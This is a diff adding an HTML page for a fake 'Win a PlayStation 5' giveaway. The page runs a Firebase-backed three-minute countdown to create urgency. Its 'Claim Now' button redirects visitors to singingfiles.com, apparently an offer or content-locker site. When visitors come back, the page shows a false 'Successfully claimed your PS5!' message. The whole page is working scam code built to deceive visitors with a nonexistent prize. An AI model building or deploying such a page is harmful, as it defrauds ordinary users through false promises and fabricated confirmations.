@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PS5 Giveaway</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0e0e0e;
+      font-family: 'Segoe UI', sans-serif;
+      color: white;
+      overflow-x: hidden;
+    }
+
+    .wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem;
+      max-width: 600px;
+      margin: auto;
+      text-align: center;
+      position: relative;
+    }
+
+    img {
+      width: 100%;
+      border-radius: 16px;
+      box-shadow: 0 0 20px rgba(255,255,255,0.1);
+      margin-bottom: 1.5rem;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 0.5rem;
+    }
+
+    p {
+      color: #ccc;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .countdown {
+      font-size: 2rem;
+      color: #00ffcc;
+      margin-bottom: 1.5rem;
+      animation: pulse 1s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.1); opacity: 0.7; }
+    }
+
+    .cta-btn {
+      padding: 1rem 2rem;
+      background: linear-gradient(to right, #4e00ff, #8e2de2);
+      border: none;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .cta-btn:hover {
+      transform: scale(1.05);
+    }
+
+    .blur {
+      filter: blur(8px);
+      pointer-events: none;
+    }
+
+    .modal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      display: none;
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    .modal-box {
+      background: #1a1a1a;
+      padding: 2rem;
+      border-radius: 16px;
+      max-width: 90%;
+      text-align: center;
+    }
+
+    .modal-box p {
+      margin-bottom: 1rem;
+      font-size: 1.2rem;
+    }
+
+    .close-btn {
+      padding: 0.5rem 1rem;
+      border: none;
+      background: #ff3c3c;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="modal" id="modal">
+    <div class="modal-box">
+      <p id="modalText"></p>
+      <button class="close-btn" onclick="closeModal()">Close</button>
+    </div>
+  </div>
+
+  <div class="wrapper" id="mainContent">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQlD6Q7aP97ffVoXf0Le_ezYEem5slumQTY4tz35qhjOzf-AzHmvbOkyz0&s=10" alt="PS5 Giveaway"/>
+    <h1>Win a PlayStation 5</h1>
+    <p>Only 1 per person! Complete the form on the next page to claim your PS5 before the timer runs out.</p>
+    <div class="countdown" id="countdown">3:00</div>
+    <button class="cta-btn" id="claimBtn">Claim Now</button>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+    import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+    import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-auth.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDFHskUWiyHhZke3KT9kkOtFI_gPsKfiGo",
+      authDomain: "itzhoyoo-f9f7e.firebaseapp.com",
+      databaseURL: "https://itzhoyoo-f9f7e-default-rtdb.firebaseio.com",
+      projectId: "itzhoyoo-f9f7e",
+      storageBucket: "itzhoyoo-f9f7e.appspot.com",
+      messagingSenderId: "1094792075584",
+      appId: "1:1094792075584:web:d49e9c3f899d3cd31082a5",
+      measurementId: "G-LLT6F9WRKH"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    const auth = getAuth();
+
+    let uid = null;
+    const countdownElement = document.getElementById("countdown");
+    const modal = document.getElementById("modal");
+    const modalText = document.getElementById("modalText");
+    const mainContent = document.getElementById("mainContent");
+
+    signInAnonymously(auth).then(() => {
+      onAuthStateChanged(auth, async (user) => {
+        if (user) {
+          uid = user.uid;
+          const userRef = ref(db, `ps5Countdown/${uid}`);
+          const snapshot = await get(userRef);
+          let startTime;
+
+          if (snapshot.exists()) {
+            startTime = snapshot.val();
+          } else {
+            startTime = Date.now();
+            await set(userRef, startTime);
+          }
+
+          startCountdown(startTime);
+        }
+      });
+    });
+
+    function startCountdown(startTime) {
+      const interval = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const remaining = 180000 - elapsed;
+
+        if (remaining <= 0) {
+          clearInterval(interval);
+          showModal("Offer expired. You missed your chance.");
+          mainContent.classList.add("blur");
+          document.getElementById("claimBtn").disabled = true;
+          countdownElement.textContent = "00:00";
+        } else {
+          const minutes = Math.floor(remaining / 60000).toString().padStart(1, '0');
+          const seconds = Math.floor((remaining % 60000) / 1000).toString().padStart(2, '0');
+          countdownElement.textContent = `${minutes}:${seconds}`;
+        }
+      }, 1000);
+    }
+
+    function showModal(message) {
+      modalText.textContent = message;
+      modal.classList.add("active");
+    }
+
+    function closeModal() {
+      modal.classList.remove("active");
+    }
+
+    // CLAIM button logic
+    document.getElementById("claimBtn").addEventListener("click", () => {
+      set(ref(db, `ps5Claims/${uid}`), {
+        claimedAt: Date.now()
+      });
+      localStorage.setItem("ps5-claim-status", "pending");
+
+      window.location.href = "https://singingfiles.com/show.php?l=0&u=2392480&id=63315";
+    });
+
+    // Success message on return
+    window.addEventListener("load", () => {
+      const status = localStorage.getItem("ps5-claim-status");
+      if (status === "pending") {
+        const claimedTime = localStorage.getItem("ps5-claim-time");
+        if (claimedTime && Date.now() - parseInt(claimedTime) > 20000) {
+          showModal("Successfully claimed your PS5! We’ll be in touch.");
+          localStorage.removeItem("ps5-claim-status");
+        } else {
+          localStorage.setItem("ps5-claim-time", Date.now());
+        }
+      }
+    });
+  </script>
+</body>
+</html>
